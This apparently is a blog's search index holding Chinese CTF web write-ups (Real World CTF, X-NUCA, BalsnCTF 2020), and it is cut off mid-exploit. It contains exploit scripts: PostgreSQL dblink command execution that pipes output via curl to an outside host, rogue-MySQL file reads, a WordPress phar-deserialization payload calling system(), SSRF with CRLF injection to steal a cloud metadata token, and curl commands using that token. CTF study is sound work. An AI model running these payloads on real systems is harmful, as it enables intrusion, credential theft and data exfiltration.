<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>real world ctf 2020</title>
      <link href="2021/01/14/real%20world%20ctf%202020/"/>
      <url>2021/01/14/real%20world%20ctf%202020/</url>
      
        <content type="html"><![CDATA[<h1 id="Real-World-CTF-2020"><a href="#Real-World-CTF-2020" class="headerlink" title="Real World CTF 2020"></a>Real World CTF 2020</h1><p>比赛很棒，题目很好，我很菜</p><h2 id="DBaaSadge"><a href="#DBaaSadge" class="headerlink" title="DBaaSadge"></a>DBaaSadge</h2><p>就一个PostgreSQL任意语句执行，给的权限不是superuser，但大部分操作是能进行的</p><pre><code class="php">&lt;?phperror_reporting(0);if(!$sql=(string)$_GET[&quot;sql&quot;]){  show_source(__FILE__);  die();}header(&#39;Content-Type: text/plain&#39;);if(strlen($sql)&gt;100){  die(&#39;That query is too long ;_;&#39;);}if(!pg_pconnect(&#39;dbname=postgres user=realuser&#39;)){  die(&#39;DB gone ;_;&#39;);}if($query = pg_query($sql)){  print_r(pg_fetch_all($query));} else {  die(&#39;._.?&#39;);}</code></pre><p>题目提供了docker文件</p><p>看下Dockerfile发现：</p><pre><code>安装了postgresql-10-mysql-fdw还开启了dblink</code></pre><p>相关的介绍文章：</p><p><a href="https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/" target="_blank" rel="noopener">https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/</a></p><p><a href="https://www.postgresql.org/docs/10/contrib-dblink-function.html" target="_blank" rel="noopener">https://www.postgresql.org/docs/10/contrib-dblink-function.html</a></p><p>一个是远程连接mysql，一个是远程连接postgresql 。</p><p>mysql客户端有个非常有名的漏洞：<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，即客户端文件读取，利用<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a> 搭建一个恶意mysql服务端成功读取到文件</p><pre><code>CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#39;ccreater.top&#39;,port&#39;63306&#39;)CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#39;a&#39;, password &#39;a&#39;);CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#39;a&#39;,table_name &#39;a&#39;)select * from c</code></pre><p>结合dblink很自然的想到读取postgress数据库存储文件获得superuser密码再任意命令执行</p><p>通过本地搭建环境获得数据库文件位置：/var/lib/postgresql/10/main/base</p><p>已查找一下postgresql为关键词查找文件得到密码所在文件：</p><p><code>/var/lib/postgresql/10/main/global/1260</code></p><p>查找一下postgresql的加密规则：md5(password+username)</p><p>exp.py</p><pre><code class="python">import requestssqls=[      &quot;CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#39;ccreater.top&#39;,port&#39;63306&#39;)&quot;,      &quot;CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#39;a&#39;, password &#39;a&#39;)&quot;,      &quot;CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#39;a&#39;,table_name &#39;a&#39;)&quot;,      &quot;select * from c&quot;]sqls=[      &quot;select dblink(&#39;host=0 password=jpr5q&#39;,&#39;copy(select)to program&#39;&#39;curl y5pwcd.ceye.io/`/readflag`&#39;&#39;&#39;)&quot;]def hack(sql):      burp0_url = &quot;http://54.219.197.26:60080/&quot;      burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;}      r= requests.get(burp0_url, headers=burp0_headers,params={            &quot;sql&quot;:sql      })      print(r.text)for sql in sqls:      hack(sql)</code></pre><p>rwctf{pop_cat_says_p1ea5e_upd4t3_youR_libmysqlclient_kekW}</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2021/01/14/real">https://www.ccreater.top/2021/01/14/real</a> world ctf 2020/](<a href="https://www.ccreater.top/2021/01/14/real">https://www.ccreater.top/2021/01/14/real</a> world ctf 2020/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020xnuca_ezwp题解</title>
      <link href="2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/"/>
      <url>2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-xnuca-ezwp题解"><a href="#2020-xnuca-ezwp题解" class="headerlink" title="2020 xnuca ezwp题解"></a>2020 xnuca ezwp题解</h1><p>wpscan扫一波发现wp是最新版本</p><p>本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这</p><p>漏洞分析：<a href="https://paper.seebug.org/774/" target="_blank" rel="noopener">https://paper.seebug.org/774/</a></p><p>对wp和插件对比以下官方下载的，存在以下差异</p><h2 id="文件对比"><a href="#文件对比" class="headerlink" title="文件对比"></a>文件对比</h2><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>/wp-admin/includes/class-wp-screen.php 294行</p><hr><p>官方</p><pre><code>if ( isset( $_GET[&#39;post&#39;] ) &amp;&amp; isset( $_POST[&#39;post_ID&#39;] ) &amp;&amp; (int) $_GET[&#39;post&#39;] !== (int) $_POST[&#39;post_ID&#39;] ) {                        wp_die( __( &#39;A post ID mismatch has been detected.&#39; ), __( &#39;Sorry, you are not allowed to edit this item.&#39; ), 400 );                    } elseif ( isset( $_GET[&#39;post&#39;] ) ) {                        $post_id = (int) $_GET[&#39;post&#39;];                    } elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {                        $post_id = (int) $_POST[&#39;post_ID&#39;];                    } else {                        $post_id = 0;                    }</code></pre><p>题目</p><pre><code>if ( isset( $_GET[&#39;post&#39;] ) ) {                        $post_id = (int) $_GET[&#39;post&#39;];                    } elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {                        $post_id = (int) $_POST[&#39;post_ID&#39;];                    } else {                        $post_id = 0;                    }</code></pre><hr><p>/wp-admin/includes/file.php 762行加了一个文件名不能包含php的waf（只检测了小写）</p><p>官方</p><pre><code>空</code></pre><p>题目</p><pre><code>if ( (stristr(file_get_contents($file[&#39;tmp_name&#39;]), &quot;php&quot;) !== FALSE) ) {        return call_user_func_array( $upload_error_handler, array( &amp;$file, __( &#39;Sorry, this file content is not permitted for security reasons.&#39; ) ) );    }</code></pre><hr><p>/wp-admin/includes/post.php 221</p><p>array_diff_key 参数少了’file’</p><p>官方</p><pre><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;file&#39;, &#39;guid&#39; ) ) );</code></pre><p>题目</p><pre><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) );</code></pre><hr><p>wp-admin/post.php 19行，少了很多条件</p><p>官方</p><pre><code>if ( isset( $_GET[&#39;post&#39;] ) &amp;&amp; isset( $_POST[&#39;post_ID&#39;] ) &amp;&amp; (int) $_GET[&#39;post&#39;] !== (int) $_POST[&#39;post_ID&#39;] ) {    wp_die( __( &#39;A post ID mismatch has been detected.&#39; ), __( &#39;Sorry, you are not allowed to edit this item.&#39; ), 400 );} elseif ( isset( $_GET[&#39;post&#39;] ) ) {    $post_id = (int) $_GET[&#39;post&#39;];} elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {    $post_id = (int) $_POST[&#39;post_ID&#39;];} else {    $post_id = 0;}</code></pre><p>题目</p><pre><code>if ( isset( $_GET[&#39;post&#39;] ) ) {    $post_id = (int) $_GET[&#39;post&#39;];} elseif ( isset( $_POST[&#39;post_ID&#39;] ) ) {    $post_id = (int) $_POST[&#39;post_ID&#39;];} else {    $post_id = 0;}</code></pre><p>wp-includes\Requests\Utility\FilteredIterator.php<br>删除了:</p><pre><code>public function unserialize( $serialized ) {    }    /**     * @inheritdoc     */    public function __unserialize( $serialized ) { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__unserializeFound    }    public function __wakeup() { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__wakeupFound        unset( $this-&gt;callback );    }</code></pre><h3 id="contact-form-7"><a href="#contact-form-7" class="headerlink" title="contact form 7"></a>contact form 7</h3><p>原来：<br>134行：</p><pre><code>    return wp_mail( $recipient, $subject, $body, $headers, $attachments );}</code></pre><p>题目：</p><pre><code>return $this-&gt;send_mail( $recipient, $subject, $body, $headers, $attachments );    }    public function send_mail($to, $subject, $message, $headers = &#39;&#39;, $attachments = array()) {        try {            $host = explode(&quot;@&quot;, $to)[1];            $url = &quot;http://$host&quot;;            $post_data = array(                &quot;subject&quot; =&gt; $subject,                &quot;message&quot; =&gt; $message,                &quot;headers&quot; =&gt; $headers            );            if ($attachments !== array()) {                if (!empty($attachments[0])) {                    $post_data[&quot;file&quot;] = curl_file_create($attachments[0]);                }            }            $ch = curl_init();            curl_setopt($ch , CURLOPT_URL , $url);            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);            curl_setopt($ch , CURLOPT_POST, 1);            curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);            curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);            $data = curl_exec($ch);            curl_close($ch);            if ($data) {                file_put_contents(&quot;/tmp/1.log&quot;, $data);            }            return true;        } catch (Exception $e) {            return false;        }    }</code></pre><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟以下之前的漏洞发现，漏洞点调用了wp_mail，而题目改成了send_mail，里面的存在文件系统相关的函数，加上题目删除反序列化的方法，大概率思路就是利用之前的漏洞+反序列化getshell</p><h2 id="绕过最新版本wp限制来利用历史漏洞"><a href="#绕过最新版本wp限制来利用历史漏洞" class="headerlink" title="绕过最新版本wp限制来利用历史漏洞"></a>绕过最新版本wp限制来利用历史漏洞</h2><p>利用原来的payload直接打过去发现不太行，跟踪发现：</p><p>/wp-admin/includes/post.php 221：</p><p><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) );</code></p><p>最新版wp对post数据进行了过滤，删除了meta_input和guid的键，导致我们无法写入postmeta,继续跟踪发现有个地方可以用别的键写入postmeta:</p><p>/wp-admin/includes/post.php 872：</p><p><code>add_meta( $post_ID );</code></p><pre><code class="php">function add_meta( $post_ID ) {    $post_ID = (int) $post_ID;    $metakeyselect = isset( $_POST[&#39;metakeyselect&#39;] ) ? wp_unslash( trim( $_POST[&#39;metakeyselect&#39;] ) ) : &#39;&#39;;    $metakeyinput  = isset( $_POST[&#39;metakeyinput&#39;] ) ? wp_unslash( trim( $_POST[&#39;metakeyinput&#39;] ) ) : &#39;&#39;;    $metavalue     = isset( $_POST[&#39;metavalue&#39;] ) ? $_POST[&#39;metavalue&#39;] : &#39;&#39;;    if ( is_string( $metavalue ) ) {        $metavalue = trim( $metavalue );    }    if ( ( ( &#39;#NONE#&#39; !== $metakeyselect ) &amp;&amp; ! empty( $metakeyselect ) ) || ! empty( $metakeyinput ) ) {        /*         * We have a key/value pair. If both the select and the input         * for the key have data, the input takes precedence.         */        if ( &#39;#NONE#&#39; !== $metakeyselect ) {            $metakey = $metakeyselect;        }        if ( $metakeyinput ) {            $metakey = $metakeyinput; // Default.        }        if ( is_protected_meta( $metakey, &#39;post&#39; ) || ! current_user_can( &#39;add_post_meta&#39;, $post_ID, $metakey ) ) {            return false;        }        $metakey = wp_slash( $metakey );        return add_post_meta( $post_ID, $metakey, $metavalue );    }    return false;}</code></pre><p>但是这里有个is_protected_meta,跟进去发现这个函数限制了我们的键不能以<code>_</code>开头，按照原来的payload，到这里好像死路了。</p><p>但是我们跟踪以下插件渲染表单的代码发现</p><p>contact-form.php:129</p><p>class WPCF7_ContactForm</p><pre><code class="php">private function __construct( $post = null ) {        $post = get_post( $post );        if ( $post &amp;&amp; self::post_type == get_post_type( $post ) ) {            $this-&gt;id = $post-&gt;ID;            $this-&gt;name = $post-&gt;post_name;            $this-&gt;title = $post-&gt;post_title;            $this-&gt;locale = get_post_meta( $post-&gt;ID, &#39;_locale&#39;, true );            $properties = $this-&gt;get_properties();            foreach ( $properties as $key =&gt; $value ) {                if ( metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key ) ) {                    $properties[$key] = get_post_meta( $post-&gt;ID, &#39;_&#39; . $key, true );                } elseif ( metadata_exists( &#39;post&#39;, $post-&gt;ID, $key ) ) {                    $properties[$key] = get_post_meta( $post-&gt;ID, $key, true );                }            }            $this-&gt;properties = $properties;            $this-&gt;upgrade();        }        do_action( &#39;wpcf7_contact_form&#39;, $this );    }</code></pre><p>contact form 的属性啥的就是从<code>$properties</code>中取出(<code>_mail</code>就在这里面)，想要利用历史漏洞我们必须能够控制<code>_mail</code>的值</p><p><code>metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key )</code>:它先会去表中查找<code>&quot;_&quot;.&quot;mail&quot;</code>这个属性，没有的话再去查找<code>&quot;mail&quot;</code>属性，正好我们前面找到一个可以控制非<code>_</code>开头的postmeta</p><p>于是构造</p><pre><code class="javascript">var settings = {    &quot;async&quot;: true,    &quot;crossDomain&quot;: true,    &quot;url&quot;: &quot;/wp-admin/post.php?post=1&quot;,    &quot;method&quot;: &quot;POST&quot;,    &quot;data&quot;: {        &quot;_wpnonce&quot;: document.getElementById(&quot;_wpnonce&quot;).value,        &quot;_wp_http_referer&quot;: &quot;%2Fwp-admin%2Fpost-new.php&quot;,        &quot;user_ID&quot;: &quot;3&quot;,        &quot;action&quot;: &quot;post&quot;,        &quot;originalaction&quot;: &quot;editpost&quot;,        &quot;post_author&quot;: &quot;3&quot;,        &quot;post_type&quot;: &quot;wpcf7_contact_form&quot;,        &quot;original_post_status&quot;: &quot;auto-draft&quot;,        &quot;auto_draft&quot;: &quot;&quot;,        &quot;post_title&quot;: &quot;readflagtotmp2log&quot;,        &quot;content&quot;: &quot;test&quot;,        &quot;wp-preview&quot;: &quot;&quot;,        &quot;hidden_post_status&quot;: &quot;draft&quot;,        &quot;post_status&quot;: &quot;draft&quot;,        &quot;hidden_post_password&quot;: &quot;&quot;,        &quot;hidden_post_visibility&quot;: &quot;public&quot;,        &quot;visibility&quot;: &quot;public&quot;,        &quot;post_password&quot;: &quot;&quot;,        &quot;mm&quot;: &quot;12&quot;,        &quot;jj&quot;: &quot;22&quot;,        &quot;_thumbnail_id&quot;: &quot;-1&quot;,        &quot;advanced_view&quot;: &quot;1&quot;,        &quot;comment_status&quot;: &quot;open&quot;,        &quot;ping_status&quot;: &quot;open&quot;,        &quot;post_name&quot;: &quot;&quot;,        &quot;metakeyinput&quot;:&quot;mail&quot;,        &quot;metavalue[subject]&quot;: &quot;test \&quot;[your-subject]\&quot;&quot;,        &quot;metavalue[sender]&quot;: &quot;2&quot;,        &quot;metavalue[recipient]&quot;: &quot;ccreater@172.16.8.6:60000&quot;,        &quot;metavalue[body]&quot;: &quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;,        &quot;metavalue[additional_headers]&quot;: &quot;Reply-To: [your-email]&quot;,        &quot;metavalue[attachments]&quot;: &quot;phar://./wp-content/uploads/2020/12/phar.jpg&quot;,        &quot;metavalue[use_html]&quot;: &quot;false&quot;,        &quot;metavalue[exclude_blank]&quot;: &quot;false&quot;,        &quot;metakeyselect&quot;:&quot;#NONE#&quot;    }}jQuery.ajax(settings).done(function (response) {    console.log(response);});</code></pre><p>在dashboard那里执行这个js</p><p>成功写入<code>mail</code>:</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png" alt="image8421"></p><p>因为没有<code>_form</code>属性（上面那个设置postmeta的一次只能设置一个），所以我们要手动提交<code>jQuery(&quot;.wpcf7-form&quot;).submit()</code>，接着就可以读取文件和反序列化了</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code class="php">&lt;?phpnamespace Kigkonsult\Icalcreator{    class Vtimezone{        public $timezonetype;        public $components;        public function __construct($val)        {            $this-&gt;components = $val;        }    }}namespace {    require( &#39;wp-load.php&#39; );  //???????    require_once( dirname( __FILE__ ) . &#39;/wp-includes/Requests/Utility/FilteredIterator.php&#39; );    $arr  = array(        &quot;1&quot; =&gt; &quot;/readflag&gt;/tmp/2.log&quot;  //payload    );    $obj_ = new Requests_Utility_FilteredIterator( $arr, &quot;system&quot; );    $obj  = new Kigkonsult\Icalcreator\Vtimezone( $obj_ );    @unlink( &quot;test.gif&quot; );    $phar = new Phar( &quot;test.phar&quot; );    $phar-&gt;startBuffering();    $phar-&gt;setStub( base64_decode( &quot;/9j/4AAQSkZJRgABAgEASABIAAD//gARSlBFRyBJbWFnZXIgMi4x/9sAhAAGBAUGBQQGBgUGBwcGCAoQCgoJCQoUDg8MEBcUGBgXFBYWGh0lHxobIxwWFiAsICMmJykqKRkfLTAtKDAlKCkoAQMEBAUE&quot; ) . &quot; __HALT_COMPILER(); ?&gt;&quot; );    $phar-&gt;setMetadata( $obj );    $phar-&gt;addFromString( &quot;test.txt&quot;, &quot;test&quot; ); //????????    //??????    $phar-&gt;stopBuffering();    rename( &quot;test.phar&quot;, &quot;test.gif&quot; );}</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/12/14/2020xnuca_ezwp题解/">https://www.ccreater.top/2020/12/14/2020xnuca_ezwp题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 balsn ctf web 部分题解</title>
      <link href="2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-BalsnCTF-web-部分题解"><a href="#2020-BalsnCTF-web-部分题解" class="headerlink" title="2020 BalsnCTF web 部分题解"></a>2020 BalsnCTF web 部分题解</h1><p>文章首发于<a href="https://www.anquanke.com/post/id/222675" target="_blank" rel="noopener">安全客</a></p><p>题目文件：<a href="https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ</a><br>提取码：v7qg </p><h2 id="tpc"><a href="#tpc" class="headerlink" title="tpc"></a>tpc</h2><p><a href="http://35.194.175.80:8000/" target="_blank" rel="noopener">http://35.194.175.80:8000/</a></p><p>题目说flag就在工作目录下并且不可以暴力猜解出文件名</p><p>试着file协议，发现可以任意文件读取，那么我们首先要做的是试着读取源文件</p><p>读取/proc/self/cmdline查看启动命令</p><p><code>/usr/local/bin/python /usr/local/bin/gunicorn main-dc1e2f5f7a4f359bb5ce1317a:app --bind 0.0.0.0:8000 --workers 5 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -</code></p><p>谷歌以下gunicorn的用法很容易知道源文件就是<code>main-dc1e2f5f7a4f359bb5ce1317a.py</code></p><p>再读取/proc/self/environ查看环境变量</p><pre><code>HOSTNAME=tpc-1PYTHON_PIP_VERSION=19.0.3SHLVL=1HOME=/home/ggGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8PYTHON_VERSION=3.7.2PWD=/opt/workdir</code></pre><p>于是就知道源文件在 /opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py</p><pre><code class="python">import urllib.requestfrom flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/query&quot;)def query():    site = request.args.get(&#39;site&#39;)    text = urllib.request.urlopen(site).read()    return text@app.route(&quot;/&quot;)def hello_world():    return &quot;/query?site=[your website]&quot;if __name__ == &quot;__main__&quot;:    app.run(debug=False, host=&quot;0.0.0.0&quot;, port=8000)</code></pre><p>就提供了一个很简单的ssrf功能，那么为了找到下一步的思路，就必须收集更多信息，用字典fuzz一下得到以下关键信息</p><p>/proc/1/net/arp</p><pre><code>172.17.0.4       0x1         0x0         00:00:00:00:00:00     *        docker0172.17.0.3       0x1         0x0         00:00:00:00:00:00     *        docker0172.17.0.2       0x1         0x2         02:42:ac:11:00:02     *        docker010.140.0.1       0x1         0x2         42:01:0a:8c:00:01     *        eth0</code></pre><p>/etc/hosts</p><pre><code># /etc/hosts: Local Host Database## This file describes a number of aliases-to-address mappings for the for # local hosts that share this file.## In the presence of the domain name service or NIS, this file may not be # consulted at all; see /etc/host.conf for the resolution order.## IPv4 and IPv6 localhost aliases127.0.0.1    localhost::1        localhost## Imaginary network.#10.0.0.2               myname#10.0.0.3               myfriend## According to RFC 1918, you can use the following IP networks for private # nets which will never be connected to the Internet:##       10.0.0.0        -   10.255.255.255#       172.16.0.0      -   172.31.255.255#       192.168.0.0     -   192.168.255.255## In case you want to be able to connect directly to the Internet (i.e. not # behind a NAT, ADSL router, etc...), you need real official assigned # numbers.  Do not try to invent your own network numbers but instead get one # from your network provider (if any) or from your regional registry (ARIN, # APNIC, LACNIC, RIPE NCC, or AfriNIC.)#169.254.169.254 metadata.google.internal metadata</code></pre><p>hosts文件里面添加了一条特殊的记录，谷歌一下发现里面存放着实例的一些数据</p><p>直接访问<code>metadata.google.internal</code>，得到：</p><p><code>0.1/ computeMetadata/</code></p><p>继续访问下一级目录发现500了</p><p>阅读<a href="https://cloud.google.com/compute/docs/storing-retrieving-metadata#querying" target="_blank" rel="noopener">文档</a>得知要加入<code>Metadata-Flavor: Google</code>请求头</p><p>python的urlllib库之前爆出存在着CRLF的漏洞，利用这个来绕过</p><p><code>&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal/PATH/%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</code></p><p>写个脚本读取所有数据：</p><pre><code class="python">import requestsdef req(parent,path):    burp0_url = &quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal&quot;+parent+path+&quot;%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;    return requests.get(burp0_url)def getInfo(parent,path):    r = req(parent,path)    if r.status_code == 500:        return    print(parent+path)    print(r.text)    print(&quot;----------------------------------------------------------------------&quot;)    if not path.endswith(&quot;/&quot;):        return    child = r.text.splitlines()    parent=parent+path    for i in child:        getInfo(parent,i)getInfo(parent=&quot;&quot;,path=&quot;/&quot;)</code></pre><p>得到以下数据（只显示对题目有用的数据）</p><pre><code>...----------------------------------------------------------------------/computeMetadata/v1/project/project-idbalsn-ctf-2020-tpc------------------------------------------------------------------/computeMetadata/v1/instance/service-accounts/default/token{&quot;access_token&quot;:&quot;ya29.c.KpcB5QdRi_ofZUDT6YcnsZrXwex0ocEfddkf1cL9qgsBVUuJI6xm7X__zkSxCc4jbw35HGJ2ZSbVUQljIKqOWbe_-q33It_9ip0sO15lH8usKPuj1I-vg2BHQeyizyWloiDf2vlRbL0EiZNaiKa3_tGFFEbxt9JrmsfYxWoN3_VOn3cqTbjNyEdj3-Xr3oQUiD0ESz0H2NS4Lg&quot;,&quot;expires_in&quot;:3147,&quot;token_type&quot;:&quot;Bearer&quot;}----------------------------------------------------------------------/computeMetadata/v1/instance/service-accounts/default/scopeshttps://www.googleapis.com/auth/devstorage.read_onlyhttps://www.googleapis.com/auth/logging.writehttps://www.googleapis.com/auth/monitoring.writehttps://www.googleapis.com/auth/servicecontrolhttps://www.googleapis.com/auth/service.management.readonlyhttps://www.googleapis.com/auth/trace.append----------------------------------------------------------------------...</code></pre><p>阅读<a href="https://cloud.google.com/storage/docs" target="_blank" rel="noopener">文档</a>来了解下载存储在服务器上的数据</p><pre><code class="shell">#查询存储分区：curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \  &quot;https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc&quot;#查询存储对象curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \  &quot;https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o&quot;#下载对象：curl -X GET -o &quot;/tmp/obj1&quot; -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \  &quot;https://www.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4?generation=1605158579380048&amp;alt=media&quot;</code></pre><p>将所有对象下载下来后<code>cat * | grep -a flag</code><br>获得flag路径：<code>/opt/workdir/flag-6ba72dc9ffb518f5bcd92eee.txt</code></p><p>BALSN{What_permissions_does_the_service_account_need}</p><h2 id="L5D"><a href="#L5D" class="headerlink" title="L5D"></a>L5D</h2><p>题目描述</p><blockquote><p>「Taking L5D was a profound experience, one of the most important things in my life.」</p><p>Try this new Unserialize-Oriented Programming System a.k.a. L5D !</p><p><a href="http://l5d.balsnctf.com:12345/index.php" target="_blank" rel="noopener">http://l5d.balsnctf.com:12345/index.php</a></p><p>PHP Version: 7.0.33</p><p>Author: kaibro</p></blockquote><p>题目提供了源码，阅读后发现以下可能作为关键点的地方：</p><p>变量覆盖：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142917.jpg" alt="image6765"></p><p>任意命令执行：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142948.jpg" alt="image6899"></p><p>修改全局变量cmd</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116143051.jpg" alt="image7035"></p><p>但是题目给反序列化的数据加上了一个限制：不能出现<code>*</code>(protect变量就需要<code>*</code>号)</p><p>实际测试一下发现，并不能用public,private的同名变量来代替protect变量，这是难点一</p><p>还有就是其他类的<code>__wakeup</code>方法会禁止我们通过L5D_Upload来任意变量覆盖，然后L5D_Upload又必须在其他的<code>__destruct</code>方法前执行，这是难点二</p><p>难点二我们可以通过最后一个调用L5D_Upload的<code>__wakeup</code>，第一个调用它的<code>__destruct</code>来绕过，因为<code>__wakeup</code>的调用顺序是从里到外，从前到后，<code>__destruct</code>的调用顺序是从外到内，从前到后，所以构造</p><pre><code class="php">class L5D_Upload{    public $padding;    public function __construct()    {        $this-&gt;padding = new L5D_ResetCMD();    }}class L5D_ResetCMD {    public $padding;    protected $new_cmd = &quot;cat /flag&quot;;    public function __construct()    {        $this-&gt;padding=new L5D_Command();    }}class L5D_Command{}new L5D_Upload();</code></pre><p>接着就是难点一了，对<code>*</code>号的禁用导致我们不能直接反序列化一个protect属性的成员</p><p>但是我们可以用大写S来绕过：</p><p>可以利用大写S来绕过对protected,private等属性的字符检测如：</p><pre><code>O:12:&quot;L5D_ResetCMD&quot;:2:{s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:{}S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;}</code></pre><p>这样new_cmd就是protect属性了</p><p>最后的exp:</p><pre><code class="php">class L5D_Upload{    public $padding;    public function __construct()    {        $this-&gt;padding = new L5D_ResetCMD();    }}class L5D_ResetCMD {    public $padding;    protected $new_cmd = &quot;cat 